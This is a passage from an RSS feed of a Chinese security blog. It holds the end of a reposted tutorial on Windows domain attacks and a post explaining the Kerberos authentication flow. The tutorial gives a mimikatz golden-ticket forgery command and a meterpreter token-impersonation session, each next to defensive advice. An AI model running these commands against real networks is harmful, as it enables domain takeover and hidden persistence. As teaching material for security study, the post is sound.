&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/10.png&#34;
	width=&#34;2718&#34;
	height=&#34;1484&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/10_hu1003f63a12a8e580579ec63bddd3dd33_1258713_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/10_hu1003f63a12a8e580579ec63bddd3dd33_1258713_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;黄金票据&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;183&#34;
		data-flex-basis=&#34;439px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;黄金票据golden-tickets---伪造&#34;&gt;黄金票据(Golden Tickets) - 伪造&lt;/h3&gt;
&lt;p&gt;伪造票据:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz “kerberos::golden /domain:&amp;lt;域名&amp;gt; /sid:&amp;lt;域SID&amp;gt; /rc4:&amp;lt;KRBTGT NTLM Hash&amp;gt; /user:&amp;lt;任意用户名&amp;gt; /ptt&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;黄金票据golden-tickets---演示&#34;&gt;黄金票据(Golden Tickets) - 演示&lt;/h3&gt;
&lt;h3 id=&#34;tickets-总结&#34;&gt;Tickets 总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;黄金票据:从攻击面来看，获取krbtgt用户的hash后，可以在域中 进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限， 使用黄金票据能够在一个域环境中长时间控制整个域。&lt;/li&gt;
&lt;li&gt;从防御角度来看，需要经常更新krbtgt的密码，才能够使得原有的 票据失效。最根本的办法是不允许域管账户登录其他服务器。&lt;/li&gt;
&lt;li&gt;白银票据:从攻击面来看，伪造白银票据的难度比伪造黄金票据的 难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储Server。&lt;/li&gt;
&lt;li&gt;从防御角度来看，需要开启PAC认证，但这会降低认证效率，增加 DC的负担，最根本的还是要加固服务器本身对外的服务。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;0x03-windows-access-token&#34;&gt;0x03 Windows Access Token&lt;/h2&gt;
&lt;h3 id=&#34;windows-access-token-简介&#34;&gt;Windows Access Token 简介&lt;/h3&gt;
&lt;p&gt;Windows Token其实叫Access Token(访问令牌)，它是一个描 述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程 时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该 进程没有B用户的权限。&lt;/p&gt;
&lt;p&gt;Access Token种类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主令牌&lt;/li&gt;
&lt;li&gt;模拟令牌&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的Access Token。&lt;/p&gt;
&lt;p&gt;当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。&lt;/p&gt;
&lt;h3 id=&#34;windows-access-token组成&#34;&gt;Windows Access Token组成&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;用户帐户的安全标识符(SID)&lt;/li&gt;
&lt;li&gt;用户所属的组的SID&lt;/li&gt;
&lt;li&gt;用于标识当前登录会话的登录SID&lt;/li&gt;
&lt;li&gt;用户或用户组所拥有的权限列表&lt;/li&gt;
&lt;li&gt;所有者SID&lt;/li&gt;
&lt;li&gt;主要组的SID&lt;/li&gt;
&lt;li&gt;访问控制列表&lt;/li&gt;
&lt;li&gt;访问令牌的来源&lt;/li&gt;
&lt;li&gt;令牌是主要令牌还是模拟令牌&lt;/li&gt;
&lt;li&gt;限制SID的可选列表&lt;/li&gt;
&lt;li&gt;目前的模拟等级&lt;/li&gt;
&lt;li&gt;其他统计数据&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;windows-access-token--sid-security-identifiers安全标识符&#34;&gt;Windows Access Token – SID (Security Identifiers)安全标识符&lt;/h3&gt;
&lt;p&gt;安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定列表，例如 Everyone这种已经内置的账户，默认拥有&lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/zh-%20cn/windows/desktop/SecAuthZ/well-known-sids&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;固定的SID&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;SID的表现形式:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;域SID-用户ID&lt;/li&gt;
&lt;li&gt;计算机SID-用户ID&lt;/li&gt;
&lt;li&gt;SID列表都会存储在域控的AD或者计算机本地账户数据库中。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;windows-access-token产生过程&#34;&gt;Windows Access Token产生过程&lt;/h3&gt;
&lt;p&gt;每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。&lt;/p&gt;
&lt;h3 id=&#34;windows-access-token令牌假冒实战&#34;&gt;Windows Access Token令牌假冒实战&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清 除，只有在重启机器后才会清除。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以使用多种工具查看目前系统上存在的模拟令牌:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Incognito&lt;/li&gt;
&lt;li&gt;Powershell - Invoke-TokenManipulation.ps1&lt;/li&gt;
&lt;li&gt;Cobalt Strike - steal_token&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;案例(针对某跨国企业的一次渗透测试 获取DC权限）: &lt;a class=&#34;link&#34; href=&#34;http://blog.360ec.net/archives/32/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://blog.360ec.net/archives/32/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;windows-access-token令牌假冒实战-1&#34;&gt;Windows Access Token令牌假冒实战&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; getsystem
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; load incognito meterpreter &amp;gt; list_tokens –u
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Delegation Tokens Available ============================== NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEM PAYLOADS\Administrator PAYLOADS\w7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; impersonate_token &amp;#34;PAYLOADS\Administrator”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[+] Delegation token available
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[+] Successfully impersonated user PAYLOADS\Administrator
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;windows-access-token令牌假冒防御&#34;&gt;Windows Access Token令牌假冒防御&lt;/h3&gt;
&lt;p&gt;禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。&lt;/p&gt;
&lt;p&gt;如果想清除假冒，重启服务器即可。&lt;/p&gt;
&lt;h2 id=&#34;0x04-知识点总结&#34;&gt;0x04 知识点总结&lt;/h2&gt;
&lt;p&gt;本次议题围绕着Windows认证分别讲解了Pass The Hash、Silver Tickets、Golden Tickets、 Impersonation Token的原理。 这些技术分别能够满足我们在渗透中持续的维持权限、提权。&lt;/p&gt;
&lt;p&gt;可拓展:&lt;/p&gt;
&lt;p&gt;域渗透技术/思路，SPN扫描，Red/Blue team&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://lolbas-project.github.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://lolbas-project.github.io/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gtfobins.github.io/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/yeyintminthuhtut/Awesome-Red-Teaming&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/yeyintminthuhtut/Awesome-Red-Teaming&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;转载自：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://payloads.online/archivers/2018-11-30/1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://payloads.online/archivers/2018-11-30/1&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>域渗透之Kerberos协议</title>
        <link>https://360rce.github.io/p/mg0ziixb/</link>
        <pubDate>Mon, 23 Nov 2020 11:42:55 +0000</pubDate>
        
        <guid>https://360rce.github.io/p/mg0ziixb/</guid>
        <description>&lt;img src="https://w.wallhaven.cc/full/2y/wallhaven-2y2y9y.jpg" alt="Featured image of post 域渗透之Kerberos协议" /&gt;&lt;h2 id=&#34;kerberos-协议简介&#34;&gt;Kerberos 协议简介&lt;/h2&gt;
&lt;p&gt;Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统 的密码技术(如:共享密钥)执行认证服务的。&lt;/p&gt;
&lt;h2 id=&#34;kerberos-协议框架&#34;&gt;Kerberos 协议框架&lt;/h2&gt;
&lt;p&gt;Kerberos 协议中主要有三个角色:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问服务的 Client&lt;/li&gt;
&lt;li&gt;提供服务的 Server&lt;/li&gt;
&lt;li&gt;KDC(Key Distribution Center)密钥分发中心&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;KDC 默认安装在域控中，而 Client 和 Server 为域内的用户或者服务，如 web 应用、数&lt;/p&gt;
&lt;p&gt;据库服务器和邮件服务器等。Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来 决定。&lt;/p&gt;
&lt;p&gt;如果把 Kerberos 中的票据比作一张火车票，那么 Client 端就是乘客，Server 就是火车， 而 KDC 就是火车站的认证系统。如果 Client 端的票据是合法的(由你本人身份证购买并且 由你本人持有)同时有访问 Server 端服务的权限(车票对应车次正确)那么你才能上车。当 然和火车票不同的是 Kerberos 中有两张票据，而火车票只有一张。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mg0ziixb/01.png&#34;
	width=&#34;1158&#34;
	height=&#34;602&#34;
	srcset=&#34;https://360rce.github.io/p/mg0ziixb/01_hub97ca46cd4741dc12326543bc3c2919c_352498_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mg0ziixb/01_hub97ca46cd4741dc12326543bc3c2919c_352498_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Kerberos 协议框架&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;192&#34;
		data-flex-basis=&#34;461px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;由上图可以看出，KDC 又分为两个部分:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Authentication Server:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;AS 的作用就是验证 Client 的身份(确认你是身份证上的本人)，&lt;/p&gt;
&lt;p&gt;验证通过就给一张 TGT(Ticket Granting Ticket)票给 Client。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ticket Granting Server:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;TGS 的作用就是通过 AS 发给 Client 的票(TGT)换取访问 Server&lt;/p&gt;
&lt;p&gt;端的票 ST(Server Ticket)。ST 也有资料称之为 TGS Ticket。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mg0ziixb/02.png&#34;
	width=&#34;1210&#34;
	height=&#34;914&#34;
	srcset=&#34;https://360rce.github.io/p/mg0ziixb/02_hu89e73f4884d44dbd606e0740fdccd304_435164_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mg0ziixb/02_hu89e73f4884d44dbd606e0740fdccd304_435164_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Kerberos 协议框架&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;132&#34;
		data-flex-basis=&#34;317px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;kerberos-认证流程&#34;&gt;Kerberos 认证流程&lt;/h2&gt;
&lt;p&gt;当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Authentication Service Exchange: Client 与 AS 的交互&lt;/li&gt;
&lt;li&gt;The Ticket Granting Service Exchange:Client 与 TGS 的交互&lt;/li&gt;
&lt;li&gt;The Client/Server Authentication Exchange:Client 与 Server 的交互&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mg0ziixb/03.png&#34;
	width=&#34;1210&#34;
	height=&#34;746&#34;
	srcset=&#34;https://360rce.github.io/p/mg0ziixb/03_hu658e9817ee94ed3a4a78accc9062332c_375136_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mg0ziixb/03_hu658e9817ee94ed3a4a78accc9062332c_375136_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Kerberos 认证流程&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;162&#34;
		data-flex-basis=&#34;389px&#34;
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;1-the-authentication-service-exchange&#34;&gt;(1) The Authentication Service Exchange&lt;/h4&gt;
&lt;h5 id=&#34;krb_as_req&#34;&gt;KRB_AS_REQ:&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Client-&amp;gt;AS:发送 Authenticator1(Client 密码加密 TimeStamp)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;第一步 Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client 密码 hash 加密的时间戳、Client ID、网络地址、加密类型等内容。&lt;/p&gt;
&lt;h5 id=&#34;kbr_as_rep&#34;&gt;KBR_AS_REP:&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;AS-&amp;gt;Client:发送 Client 密码加密的 sessionkey-as 和票据 TGT(KBRTGT HASH 加密的 sesionkey-as 和 Timestamp)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 KDC 中存储了域中所有用户的密码 hash，当 AS 接受到 Client 的请求后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 hash 加密的 sessionkey-as 和 TGT(由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信 息)。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mg0ziixb/04.png&#34;
	width=&#34;1228&#34;
	height=&#34;648&#34;
	srcset=&#34;https://360rce.github.io/p/mg0ziixb/04_hu1b3d6b814ea31def1a04d9345eb4efea_328243_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mg0ziixb/04_hu1b3d6b814ea31def1a04d9345eb4efea_328243_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;The Authentication Service Exchange&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;189&#34;
		data-flex-basis=&#34;454px&#34;
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;2-the-ticket-granting-servicetgs-exchange&#34;&gt;(2) The Ticket Granting Service(TGS) Exchange&lt;/h4&gt;
&lt;h5 id=&#34;kbr_tgs_req&#34;&gt;KBR_TGS_REQ:&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Client-&amp;gt;TGS 发送 Authenticator2(sessionkey-as 加密 timestamp)和票据 TGT(KBRTGT HASH 加密的 sessionkey-as 和 timestamp)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Client 接收到了加密的 sessionkey-as 和 TGT 后，用自身的密码解密得到 sessionkey-as， TGT 是 KDC 密码加密的，Client 无法解密。这时 Client 再用 sessionkey-as 加密 timestamp 和 TGT 一起发送给 KDC 中的 TGS(Ticket Granting Server)票据授权服务器换取能够访问 Server 的票据。&lt;/p&gt;
&lt;h5 id=&#34;kbr_tgs-rep&#34;&gt;KBR_TGS-REP:&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;TGS-&amp;gt;Client:发送密文(由 sessionkey-as 加密的 sessionkey-tgs)和票据 ST(由 server 密 码 hash 加密的 sessionkey-tgs)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检 查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情 况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址 相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mg0ziixb/05.png&#34;
	width=&#34;1220&#34;
	height=&#34;644&#34;
	srcset=&#34;https://360rce.github.io/p/mg0ziixb/05_hu71d42e9dbb4209c25ba09c37d1758ac2_330065_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mg0ziixb/05_hu71d42e9dbb4209c25ba09c37d1758ac2_330065_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;The Ticket Granting Service(TGS) Exchange&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;189&#34;
		data-flex-basis=&#34;454px&#34;
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;3-the-clientserver-authentication-exchange&#34;&gt;(3) The Client/Server Authentication Exchange&lt;/h4&gt;
&lt;h5 id=&#34;kbr_ap_req&#34;&gt;KBR_AP_REQ:&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Client-&amp;gt;Server 发送 Authenticator3(sessionkey-tgs 加密 timestamp)和票据 ST(Server 密码 hash 加密的 sessionkey-tgs)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 hash 加密的 sessionkey- tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 timestamp 和 ST 一起发送给 Server。&lt;/p&gt;
&lt;h5 id=&#34;kbr_ap_rep&#34;&gt;KBR_AP_REP:&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Server-&amp;gt;Client :&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Server 通过自己的密码解密 ST，得到 sessionkey-tgs，再用 sessionkey-tgs 解密 Authenticator3 得到 timestamp，验证正确返回验证成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mg0ziixb/06.png&#34;
	width=&#34;1212&#34;
	height=&#34;622&#34;
	srcset=&#34;https://360rce.github.io/p/mg0ziixb/06_hua2aafde0c32d05d09a43094093d79254_271442_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mg0ziixb/06_hua2aafde0c32d05d09a43094093d79254_271442_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;The Client/Server Authentication Exchange&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;194&#34;
		data-flex-basis=&#34;467px&#34;
	
&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
